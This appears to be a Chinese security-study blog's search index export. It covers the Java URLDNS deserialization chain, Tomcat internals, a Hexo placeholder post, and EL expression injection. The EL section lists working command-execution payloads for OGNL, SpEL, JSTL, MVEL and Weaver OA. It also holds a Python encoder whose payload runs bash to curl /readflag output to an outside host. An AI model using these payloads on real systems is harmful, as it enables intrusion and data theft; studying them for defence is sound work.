class="hljs-operator">,</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;</span><br></code></pre></td></tr></table></figure><p>这样如果我们在序列化时使用burpsuite监听，也会发现在序列化时就有了DNS请求，这样违背的我们的初衷，更会在一定程度上为我们造成干扰，于是我们寻找原因，发现是因为我们在hashMap方法里发现了hashCode方法，它也会进行DNS解析，所以我们一来不可以这样写，而来我们需要在put方法之前将hashcode改为非-1，因为我们如果继续跟进，会发现hashcode在初始化时就被初始化为了-1，我们如果要强制不让它进入hashcode方法，那我们就需要通过反射去动态的修改它的hashcode值，但因为它是private属性，我们对它的处理需要配合setAccessible和Declaired去获取和改变，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">      <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://z558pnxlaeaq562m58owyyob42atyi.oastify.com&quot;</span>); <span class="hljs-comment">//BurpSuite生成的监听DNS链接       </span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> url.getClass();<br>      <span class="hljs-type">Field</span> <span class="hljs-variable">urlhashcode</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<span class="hljs-comment">//获取到hashcode值并赋值给urlhashcode这个变量</span><br>      urlhashcode.setAccessible(<span class="hljs-literal">true</span>);<br>      urlhashcode.set(url,<span class="hljs-number">0</span>);<span class="hljs-comment">//将它设置为0(即非-1值)</span><br>      hashMap.put(url,<span class="hljs-number">1</span>);<span class="hljs-comment">//进行调用</span><br></code></pre></td></tr></table></figure><p>接下来我们需要将hashcode再次设置为-1，这样我们在反序列化时，hashcode为-1，于是可以进入hashCode方法从而触发DNS解析），经过BurpSuite验证为真，于是我们复现完了URLDNS链</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat源码初识（tomcat流程）</title>
    <link href="/2024/03/21/Tomcat%E6%BA%90%E7%A0%81%E5%88%9D%E8%AF%86%EF%BC%88tomcat%E6%B5%81%E7%A8%8B%EF%BC%89/"/>
    <url>/2024/03/21/Tomcat%E6%BA%90%E7%A0%81%E5%88%9D%E8%AF%86%EF%BC%88tomcat%E6%B5%81%E7%A8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<ol><li>tomcat启动类Bootstrap，启动时会执行这个类里面的main方法</li><li>创建Bootstrap对象，执行init方法<ol><li>初始化classloaders,三个加载器加载路径在conf&#x2F;catalina.properties中定义(默认catalinaLoader与sharedLoader没有设置，两个类加载器默认都是commonLoader,如果设置了，父类是commonLoader)，然后sharedLoader是后期加载项目中的class的父类加载器，有共享的class或者jar,可以配在这<img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240225215808.png" alt="image.png"></li><li>通过反射创建Catalina对象（catalinaLoader.loadClass(“org.apache.catalina.startup.Catalina”)）</li><li>设置tomcat容器父加载器 Catalina.setParentClassLoader(sharedLoader)</li></ol></li><li>load: Catalina.load()责任链模式，一层往下一层执行<ol><li>加载conf.server.xml</li><li>将xml解析成对象，digester.parse(inputSource)</li><li>一个tomcat对应一个Server，Server下包含多个Service，每个Service包含多个Connector和一个Engine，每个Engine下包含多个Host，每个Host对应一个文件夹下的项目，每个项目被包装成StandardContext，每个项目都有自己的listener，filter，servlet，每个servlet包装成wrapper对象，结构如下图<img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240225220214.png" alt="image.png"></li><li></li></ol></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/03/21/hello-world/"/>
    <url>/2024/03/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>EL表达式注入</title>
    <link href="/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>EL表达式主要功能如下</p><blockquote><p>[!NOTE]<br>获取数据:<code>EL</code>表达式主要用于替换<code>JSP</code>页面中的脚本表达式, 以从各种类型的<code>Web</code>域中检索<code>Java</code>对象、获取数据(某个<code>Web</code>域中的对象, 访问<code>JavaBean</code>的属性、访问<code>List</code>集合、访问<code>Map</code>集合、访问数组).</p><p>执行运算: 利用<code>EL</code>表达式可以在<code>JSP</code>页面中执行一些基本的关系运算、逻辑运算和算术运算, 以在<code>JSP</code>页面中完成一些简单的逻辑运算, 例如<code>$&#123;user==null&#125;</code>.</p><p>获取<code>Web</code>开发常用对象:<code>EL</code>表达式定义了一些隐式对象, 利用这些隐式对象,<code>Web</code>开发人员可以很轻松获得对<code>Web</code>常用对象的引用, 从而获得这些对象中的数据.</p><p>调用<code>Java</code>方法:<code>EL</code>表达式允许用户开发自定义<code>EL</code>函数, 以在<code>JSP</code>页面中通过<code>EL</code>表达式调用<code>Java</code>类的方法.</p></blockquote><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>可得到<code>PageContext</code>属性值.</p><blockquote><p>[!NOTE]<br>可直接访问<code>JSP</code>的内置对象, 如<code>page</code>,<code>request</code>,<code>session</code>,<code>application</code>等.</p><p>运算符丰富, 有关系运算符、逻辑运算符、算术运算符等.</p><p>扩展函数可与<code>JAVA</code>类的静态方法对应.</p></blockquote><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>所有EL表达式的格式都是以${}表示,例如 ${userinfo}代表获取变量userinfo的值.当EL表达式中的变量不给定范围时,则默认在page范围查找,然后依次在request,session,application范围查找,也可以用范围作为前缀表示属于哪个范围的变量,例如 ${pageScope.userinfo}表示访问page范围中的userinfo变量</p><h3 id="与-运算符"><a href="#与-运算符" class="headerlink" title="[]与.运算符"></a>[]与.运算符</h3><p>当要存取的属性名称中包含一些特殊字符,如.或-等非字母或数字的符号,就一定要使用[],例如${user.My-Name}就要改为 <code> $&#123;user[&quot;myname&quot;]&#125;</code></p><p>如果要动态取值时, 就可以用<code>[]</code>来做, 而<code>.</code>无法做到动态取值, 例如:<code>$&#123;sessionScope.user[data]&#125;</code>中<code>data</code>是一个变量.</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><code>EL</code>表达式存取变量数据的方法很简单, 例如:<code>$&#123;username&#125;</code>. 它的意思是取出某一范围中名称为<code>username</code>的变量. 因为我们并没有指定哪一个范围的<code>username</code>, 所以它会依序从<code>Page</code>、<code>Request</code>、<code>Session</code>、<code>Application</code>范围查找. 假如途中找到<code>username</code>, 就直接回传, 不再继续找下去, 但是假如全部的范围都没有找到时, 就回传<code>&quot;&quot;</code>.</p><h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><p><code>JSP</code>表达式语言提供以下操作符, 其中大部分是<code>Java</code>中常用的操作符:</p><table><thead><tr><th align="center">术语</th><th align="center">定义</th></tr></thead><tbody><tr><td align="center">算术型</td><td align="center"><code>+</code>、<code>-</code>(二元)、<code>*</code>、<code>/</code>、<code>div</code>、<code>%</code>、<code>mod</code>、<code>-</code>(一元).</td></tr><tr><td align="center">逻辑型</td><td align="center"><code>and</code>、<code>&amp;&amp;</code>、<code>or</code>、&#96;</td></tr><tr><td align="center">关系型</td><td align="center"><code>==</code>、<code>eq</code>、<code>!=</code>、<code>ne</code>、<code>&lt;</code>、<code>lt</code>、<code>&gt;</code>、<code>gt</code>、<code>&lt;=</code>、<code>le</code>、<code>&gt;=</code>、<code>ge</code>. 可以与其他值进行比较, 或与布尔型、字符串型、整型或浮点型文字进行比较.</td></tr><tr><td align="center">空</td><td align="center"><code>empty</code>空操作符是前缀操作, 可用于确定值是否为空.</td></tr><tr><td align="center">条件型</td><td align="center"><code>A ? B : C</code>. 根据<code>A</code>赋值的结果来赋值<code>B</code>或<code>C</code>.</td></tr></tbody></table><h3 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h3><p><code>JSP</code>表达式语言定义了一组隐式对象, 其中许多对象在<code>JSP Scriplet</code>和表达式中可用:</p><table><thead><tr><th align="center">术语</th><th align="center">定义</th></tr></thead><tbody><tr><td align="center">pageContext</td><td align="center"><code>JSP</code>页的上下文, 可以用于访问<code>JSP</code>隐式对象, 如请求、响应、会话、输出、<code>servletContext</code>等. 例如,<code>$&#123;pageContext.response&#125;</code>为页面的响应对象赋值.</td></tr></tbody></table><p>此外, 还提供几个隐式对象, 允许对以下对象进行简易访问:</p><table><thead><tr><th align="center">术语</th><th align="center">定义</th></tr></thead><tbody><tr><td align="center">param</td><td align="center">将请求参数名称映射到单个字符串参数值(通过调用<code>ServletRequest.getParameter(String name)</code>获得).<code>getParameter(String)</code>方法返回带有特定名称的参数. 表达式<code>$&#123;param.name&#125;</code>相当于<code>request.getParameter(name)</code>.</td></tr><tr><td align="center">paramValues</td><td align="center">将请求参数名称映射到一个数值数组(通过调用<code>ServletRequest.getParameter(String name)</code>获得). 它与<code>param</code>隐式对象非常类似, 但它检索一个字符串数组而不是单个值. 表达式<code>$&#123;paramvalues.name&#125;</code>相当于<code>request.getParamterValues(name)</code>.</td></tr><tr><td align="center">header</td><td align="center">将请求头名称映射到单个字符串头值(通过调用<code>ServletRequest.getHeader(String name)</code>获得). 表达式<code>$&#123;header.name&#125;</code>相当于<code>request.getHeader(name)</code>.</td></tr><tr><td align="center">headerValues</td><td align="center">将请求头名称映射到一个数值数组(通过调用<code>ServletRequest.getHeaders(String)</code>获得). 它与头隐式对象非常类似, 表达式<code>$&#123;headerValues.name&#125;</code>相当于<code>request.getHeaderValues(name)</code>.</td></tr><tr><td align="center">cookie</td><td align="center">将<code>cookie</code>名称映射到单个<code>cookie</code>对象. 向服务器发出的客户端请求可以获得一个或多个<code>cookie</code>. 表达式<code>$&#123;cookie.name.value&#125;</code>返回带有特定名称的第一个<code>cookie</code>值. 如果请求包含多个同名的<code>cookie</code>, 则应该使用<code>$&#123;headerValues.name&#125;</code>表达式.</td></tr><tr><td align="center">initParam</td><td align="center">将上下文初始化参数名称映射到单个值(通过调用<code>ServletContext.getInitparameter(String name)</code>获得).</td></tr></tbody></table><p>除了上述两种类型的隐式对象之外, 还有些对象允许访问多种范围的变量, 如<code>Web 上下文</code>、<code>会话</code>、<code>请求</code>、<code>页面</code>:</p><table><thead><tr><th align="center">术语</th><th align="center">定义</th></tr></thead><tbody><tr><td align="center">pageScope</td><td align="center">将页面范围的变量名称映射到其值. 例如,<code>EL</code>表达式可以使用<code>$&#123;pageScope.objectName&#125;</code>访问一个<code>JSP</code>中页面范围的对象, 还可以使用<code>$&#123;pageScope.objectName.attributeName&#125;</code>访问对象的属性.</td></tr><tr><td align="center">requestScope</td><td align="center">将请求范围的变量名称映射到其值, 该对象允许访问请求对象的属性. 例如,<code>EL</code>表达式可以使用<code>$&#123;requestScope.objectName&#125;</code>访问一个<code>JSP</code>请求范围的对象, 还可以使用<code>$&#123;requestScope.objectName.attributeName&#125;</code>访问对象的属性.</td></tr><tr><td align="center">sessionScope</td><td align="center">将会话范围的变量名称映射到其值, 该对象允许访问会话对象的属性. 例如,<code>$&#123;sessionScope.name&#125;</code>.</td></tr><tr><td align="center">applicationScope</td><td align="center">将应用程序范围的变量名称映射到其值, 该隐式对象允许访问应用程序范围的对象.</td></tr></tbody></table><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;ns:func(param1, param2, ...)&#125;<br></code></pre></td></tr></table></figure><p>用el表达式调用函数必须使用<code>taglib</code>引入你的标签库</p><h3 id="调用Java方法"><a href="#调用Java方法" class="headerlink" title="调用Java方法"></a>调用Java方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<span class="hljs-meta">@taglib</span> prefix=<span class="hljs-string">&quot;elFunc&quot;</span> uri=<span class="hljs-string">&quot;http://www.test.com/elFunc&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;张三&quot;</span>;<br>    request.setAttribute(<span class="hljs-string">&quot;name&quot;</span>,name);<br>%&gt;<br>调用函数：$&#123;elFunc:elFunc(name)&#125;<br></code></pre></td></tr></table></figure><h2 id="表达式注入实例"><a href="#表达式注入实例" class="headerlink" title="表达式注入实例"></a>表达式注入实例</h2><h3 id="通用POC"><a href="#通用POC" class="headerlink" title="通用POC"></a>通用POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext&#125;<br>$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>)&#125;<br>$&#123;header&#125;<br>$&#123;applicationScope&#125;<br>$&#123;pageContext.setAttribute(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass()).invoke(<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;calc.exe&quot;</span>))&#125;<br></code></pre></td></tr></table></figure><h3 id="Struts2-OGNL"><a href="#Struts2-OGNL" class="headerlink" title="Struts2 OGNL"></a>Struts2 OGNL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">@[类全名（包括包路径）]@[方法名 |  值名]，例如：<br><span class="hljs-meta">@java</span>.lang.String<span class="hljs-meta">@format(&#x27;foo %s&#x27;, &#x27;bar&#x27;)</span><br></code></pre></td></tr></table></figure><p>实例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ActionContext</span> <span class="hljs-variable">AC</span> <span class="hljs-operator">=</span> ActionContext.getContext();<br><span class="hljs-type">String</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;(new java.lang.ProcessBuilder(&#x27;calc&#x27;)).start()&#125;&quot;</span>;<br>AC.getValueStack().findValue(expression));<br><br></code></pre></td></tr></table></figure><h3 id="Spring-SPEL"><a href="#Spring-SPEL" class="headerlink" title="Spring SPEL"></a>Spring SPEL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(/&quot;</span>calc/<span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(expression).getValue().toString();<br></code></pre></td></tr></table></figure><h3 id="JSP-JSTL-EL"><a href="#JSP-JSTL-EL" class="headerlink" title="JSP JSTL_EL"></a>JSP JSTL_EL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;spring:message text=<span class="hljs-string">&quot;$&#123;/&quot;</span>/<span class="hljs-string">&quot;.getClass().forName(/&quot;</span>java.lang.Runtime/<span class="hljs-string">&quot;).getMethod(/&quot;</span>getRuntime/<span class="hljs-string">&quot;,null).invoke(null,null).exec(/&quot;</span>calc/<span class="hljs-string">&quot;,null).toString()&#125;&quot;</span>&gt;<br>&lt;/spring:message&gt;<br></code></pre></td></tr></table></figure><h3 id="Elasticsearch-MVEL"><a href="#Elasticsearch-MVEL" class="headerlink" title="Elasticsearch MVEL"></a>Elasticsearch MVEL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new java.lang.ProcessBuilder(/&quot;</span>calc/<span class="hljs-string">&quot;).start();&quot;</span>;  <br><span class="hljs-type">Boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (Boolean) MVEL.eval(expression, vars);<br></code></pre></td></tr></table></figure><h3 id="泛微OA-EL表达式注入"><a href="#泛微OA-EL表达式注入" class="headerlink" title="泛微OA EL表达式注入"></a>泛微OA EL表达式注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">login.<span class="hljs-keyword">do</span>?message=<span class="hljs-meta">@org</span>.apache.commons.io.IOUtils<span class="hljs-meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())</span><br></code></pre></td></tr></table></figure><p>或者POST</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">message=(#_memberAccess=<span class="hljs-meta">@ognl</span>.OgnlContext<span class="hljs-meta">@DEFAULT_MEMBER_ACCESS</span>).(#w=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter()).(#w.print(<span class="hljs-meta">@org</span>.apache.commons.io.IOUtils<span class="hljs-meta">@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream())</span>)).(#w.close())&amp;cmd=whoami<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /weaver/bsh.servlet.BshServlet<br>bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\\&quot;cmd+/c+calc\\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw<br></code></pre></td></tr></table></figure><h3 id="字符串拼接绕过对字符串的检测"><a href="#字符串拼接绕过对字符串的检测" class="headerlink" title="字符串拼接绕过对字符串的检测"></a>字符串拼接绕过对字符串的检测</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>Author: fault<br><br>Date: <span class="hljs-number">2024</span>-02-<span class="hljs-number">19</span> 01:<span class="hljs-number">14</span>:<span class="hljs-number">47</span><br><br>LastEditors: fault<br><br>LastEditTime: <span class="hljs-number">2024</span>-02-<span class="hljs-number">19</span> 01:<span class="hljs-number">45</span>:09<br><br>Description: wish_my_code_not_fault<br><br>version: <span class="hljs-number">1.0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">def encode(payload):</span><br><span class="hljs-string"></span><br><span class="hljs-string">    encode_payload = &quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    for i in range(0, len(payload)):</span><br><span class="hljs-string"></span><br><span class="hljs-string">        if i == 0:</span><br><span class="hljs-string"></span><br><span class="hljs-string">            encode_payload += &quot;true.toString().charAt(0).toChars(%d)[0].toString()&quot; % ord(payload[0])</span><br><span class="hljs-string"></span><br><span class="hljs-string">        else:</span><br><span class="hljs-string"></span><br><span class="hljs-string">            encode_payload += &quot;.concat(true.toString().charAt(0).toChars(%d)[0].toString())&quot; % ord(payload[i])</span><br><span class="hljs-string"></span><br><span class="hljs-string">    return encode_payload</span><br><span class="hljs-string"></span><br><span class="hljs-string">  </span><br><span class="hljs-string"></span><br><span class="hljs-string">#$&#123;pageContext.setAttribute(%s,&quot;&quot;.getClass().forName(%s).getMethod(%s,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(%s).getMethod(%s).invoke(null),%s))&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  </span><br><span class="hljs-string"></span><br><span class="hljs-string">exp = &#x27;$&#123;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(%s)&#125;&#x27; % (encode(&#x27;java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgL3JlYWRmbGFnYC5hZTc3MzUxMjgyLmlwdjYuMTQzMy5ldS5vcmc=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#x27;))</span><br><span class="hljs-string"></span><br><span class="hljs-string">  </span><br><span class="hljs-string"></span><br><span class="hljs-string">print(exp)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java各种注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
